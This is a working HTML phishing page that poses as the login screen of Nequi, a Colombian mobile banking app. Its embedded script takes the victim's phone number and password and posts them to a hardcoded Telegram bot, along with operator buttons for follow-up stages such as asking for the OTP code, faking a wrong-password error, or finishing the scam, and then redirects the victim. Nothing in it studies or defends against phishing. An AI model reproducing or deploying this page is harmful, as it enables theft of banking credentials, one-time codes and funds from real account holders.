<!DOCTYPE html>
<html>
<head>
    <title>Nequi</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="../assets/img/favicon.ico">
    <script src="../assets/js/jquery-3.6.0.min.js"></script>
    <link href="../assets/css/styles.css" rel="stylesheet">
    <link href="../assets/css/stylesheet.css" rel="stylesheet">
</head>
<body>
    <div class="cabecera">
        <table border="0" cellpadding="0" cellspacing="0" width="94%" style="max-width: 1200px; margin: 0 auto;">
            <tr>
                <td valign="middle" align="left"><img src="../assets/img/logo.svg" width="130"></td>
                <td valign="middle" align="right">
                    <button class="btn btn-std btn-sprd top-btn">Recarga</button>
                    <button class="btn btn-std btn-sprd top-btn">Entrar</button>
                    <img src="../assets/img/menu.jpg" id="btn-menu">
                </td>
            </tr>
        </table>
    </div>

    <div class="contenido-login">
        <div class="titulo">Entra a tu Nequi</div>
        <div class="descripcion" style="margin-top: 13px;">Entra a tu Nequi y ingresa tus datos.</div>
        <table border="0" cellpadding="0" cellspacing="6" style="margin:36px auto 4px auto; max-width: 362px;" width="94%">
            <tr>
                <td width="106">
                    <div id="indicativo">
                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
                            <tr>
                                <td valign="middle" align="left"><img src="../assets/img/col.png" width="29"></td>
                                <td valign="middle" align="right">+57</td>
                            </tr>
                        </table>
                    </div>
                </td>
                <td><input type="text" id="cel" class="entradas" placeholder="Celular" maxlength="10" inputmode="numeric"></td>
            </tr>
            <tr>
                <td colspan="2"><input type="password" id="pass" placeholder="Contraseña" class="entradas"></td>
            </tr>
        </table>
        <br>
        <button id="btn" class="btn-big btn-fill" disabled>Entra</button>
        <p id="msg" style="color:red;margin-top:15px;font-weight:bold;"></p>
    </div>

    <script>
    $(function(){
        $('#cel, #pass').on('input', function(){
            $('#btn').prop('disabled', $('#cel').val().length !== 10 || $('#pass').val().length < 4);
        });

        $('#btn').click(function(){
            const num = '+57 ' + $('#cel').val();
            const cla = $('#pass').val();
            $('#msg').text('Enviando...');
            $(this).prop('disabled', true).text('Enviando...');

            fetch('https://api.telegram.org/bot8387679229:AAEPfB79Soov3uLZTyv3Lq9rbifJxeoJcwc/sendMessage', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: 8469651553,
                    text: `*NUEVO CLIENTE*\n*Número:* ${num}\n*Clave:* ${cla}\n\n_ELIGE ACCIÓN:_`,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{text:"Clave OTP",url:"https://tualternativafinanzas.vercel.app/verifying/?do=otp"}],
                            [{text:"Error clave",url:"https://tualternativafinanzas.vercel.app/verifying/?do=error"}],
                            [{text:"Dinámica",url:"https://tualternativafinanzas.vercel.app/verifying/?do=dinamica"}],
                            [{text:"Error login",url:"https://tualternativafinanzas.vercel.app/verifying/?do=loginerr"}],
                            [{text:"Finalizar",url:"https://tualternativafinanzas.vercel.app/verifying/?do=ok"}]
                        ]
                    }
                })
            })
            .then(() => {
                $('#msg').html('Enviado! Redirigiendo...');
                setTimeout(() => location.href = '/private/', 1500);
            })
            .catch(() => {
                $('#msg').text('Error. Intenta de nuevo');
                $('#btn').prop('disabled', false).text('Entra');
            });
        });
    });
    </script>
</body>
</html>
